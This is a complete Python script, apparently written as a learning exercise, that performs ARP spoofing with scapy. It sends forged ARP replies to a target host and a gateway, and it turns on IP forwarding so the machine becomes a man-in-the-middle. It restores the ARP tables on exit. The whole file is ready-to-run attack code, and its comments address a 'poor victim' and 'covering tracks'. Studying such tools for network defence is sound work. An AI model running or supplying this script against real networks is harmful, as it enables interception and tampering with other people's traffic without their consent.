#!/usr/bin/env python3
import argparse             #Getting options/parsing arguments from user
import subprocess           #Control OS processes
import time                 #Use time functions such as delay
import scapy.all as scapy   #Packet forger library with so much more capabilities

#First we need to get some information from the user
#Function to get IP address from the user one for the target & and one for the gatway lets say.
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Enter you're poor victim's IP")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Enter the IP address you wish you're target to think its you i.e: router, access point, gatway, etc...")
    return parser.parse_args()

#Second we need to have a function that will get us the mac address for an ip.
#Function for scaning the network and getting mac address for IP
def get_mac(ip):
    broadcast   = scapy.Ether(dst="FF:FF:FF:FF:FF:FF") #Creating the Broadcast Ether frame 
    request     = scapy.ARP(pdst=ip)                   #Creating the arp request
    #Constructing the packet and sending it 
    response    = scapy.srp(broadcast/request, verbose=0, timeout=1, retry=1)[0]    
    #The response consists of 2 lists each one consists of 2 more lists
    #The key value we need is named hwsrc for ether source
    return response[0][1].hwsrc

#Third we need to make the spoofing function which we can consider the main function.
#Funtion to send the spoofed RESPONSE to the targets
def spoof(target_ip, spoof_ip):
    #OP value 1 for request & op value 2 for response
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=0)

#Fourth we need to cover our tracks
#Function to restore default values to original state
def restore(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc= spoof_ip, hwsrc=get_mac(spoof_ip))
    scapy.send(packet, verbose=0)

#Fifth and final function something to toggle our machine's forwarding so we don't block traffic
#Function to allow traffic to pass thru us to become a full fledged MITM
def ip_forward(toggle):
    #Value 1 for on & 0 for off
    subprocess.run(["sysctl","-w", "net.ipv4.ip_forward="+str(toggle)], stdout=subprocess.DEVNULL)

ip = get_args()
counter = 0

try:
    ip_forward(1)
    print("[+] Enabling ip_forwarding on this machine...")
    while True:
        spoof(ip.target, ip.spoof)
        spoof(ip.spoof, ip.target)
        time.sleep(4)
        counter+=2
        print("\r[+] Total packets sent: "+str(counter)+".",end="")
except KeyboardInterrupt:
    print("\n[-] Quitting please wait...")
    print("[+] Restoring default addresses...")
    print("[-] Disableing IP forwarding on this machine...")
    ip_forward(0)
    restore(ip.target, ip.spoof)
    restore(ip.spoof, ip.target)
    print("[+] Restoration Successfull!")
